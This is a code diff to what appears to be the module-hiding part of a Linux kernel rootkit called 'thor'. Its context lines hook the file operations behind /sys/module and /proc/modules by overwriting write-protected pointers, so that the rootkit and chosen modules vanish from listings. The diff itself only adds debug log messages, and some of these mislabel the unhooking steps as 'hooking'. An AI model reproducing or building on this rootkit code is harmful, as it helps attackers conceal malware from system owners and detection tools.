@@ -64,6 +64,8 @@ int lsmodhider_init(void)
         return -1;
     }
 
+    LOG_INFO("hooking /sys/module readdir / iterate");
+
     sysmodule_fops = (struct file_operations*) filep_sysmodule->f_op;
     filp_close(filep_sysmodule, NULL);
 
@@ -85,6 +87,8 @@ int lsmodhider_init(void)
         return -1;
     }
 
+    LOG_INFO("hooking /proc/modules read");
+
     procmodules_fops = (struct file_operations*) filep_procmodules->f_op;
     filp_close(filep_procmodules, NULL);
 
@@ -98,8 +102,12 @@ int lsmodhider_init(void)
 
 void lsmodhider_cleanup(void)
 {
+
     if (sysmodule_fops != NULL && orig_sysmodule_iterate != NULL) {
          void *sysmodule_iterate_addr = orig_sysmodule_iterate;
+
+        LOG_INFO("hooking /sys/module readdir / iterate");
+
 #if LINUX_VERSION_CODE < KERNEL_VERSION(3, 10, 0)
         write_no_prot(&sysmodule_fops->readdir, &sysmodule_iterate_addr, sizeof(void*));
 #else
@@ -109,6 +117,7 @@ void lsmodhider_cleanup(void)
 
     if (procmodules_fops != NULL && orig_procmodules_read != NULL) {
         void *procmodules_read_addr = orig_procmodules_read;
+        LOG_INFO("hooking /proc/modules read");
         write_no_prot(&procmodules_fops->read, &procmodules_read_addr, sizeof(void*));
     }
 
@@ -151,12 +160,14 @@ static int thor_sysmodule_filldir(void *buf, const char *name, int namelen,
 
     /* hide thor */
     if (strcmp(name, THOR_MODULENAME) == 0) {
+        LOG_INFO("hiding module %s", THOR_MODULENAME);
         return 0;
     }
 
     /* hide specified modules */
     list_for_each_entry(tmp, &(module_list.list), list) {
         if (strcmp(name, tmp->name) == 0) {
+            LOG_INFO("hiding module %s", name);
             return 0;
         }
     }
@@ -206,6 +217,8 @@ void add_to_module_list(const char *name, unsigned int len)
 {
     struct _module_list *tmp;
 
+    LOG_INFO("adding module %s from hiding list", name);
+
     tmp = (struct _module_list*) kmalloc(sizeof(struct _module_list), GFP_KERNEL);
     tmp->name = (char*) kmalloc(len, GFP_KERNEL);
     memcpy(tmp->name, name, len);
@@ -222,6 +235,7 @@ void remove_from_module_list(const char *name, unsigned int len)
     list_for_each_safe(pos, q, &(module_list.list)) {
         tmp = list_entry(pos, struct _module_list, list);
         if (strncmp(tmp->name, name, len - 1) == 0) {
+            LOG_INFO("removing module %s from hiding list", name);
             list_del(pos);
             kfree(tmp->name);
             kfree(tmp);
@@ -233,6 +247,8 @@ void clear_module_list(void)
 {
     struct _module_list *tmp;
     struct list_head *pos, *q;
+
+    LOG_INFO("clearing module hiding list");
 
     list_for_each_safe(pos, q, &(module_list.list)) {
         tmp = list_entry(pos, struct _module_list, list);
